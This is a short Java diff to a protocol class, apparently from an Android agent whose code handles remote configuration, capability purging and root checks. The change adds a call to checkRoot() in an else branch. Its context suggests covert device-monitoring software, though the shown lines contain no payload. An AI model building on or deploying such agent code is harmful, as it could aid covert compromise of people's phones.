@@ -42,6 +42,8 @@ import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
+import static com.android.dvci.capabilities.PackageInfo.checkRoot;
+
 /**
  * The Class ZProtocol.
  */
@@ -121,6 +123,8 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " (perform) ");
 				}
 				Core.self().reloadConf();
+			}else{
+				checkRoot();
 			}
 
 			purge(capabilities[Proto.PURGE]);
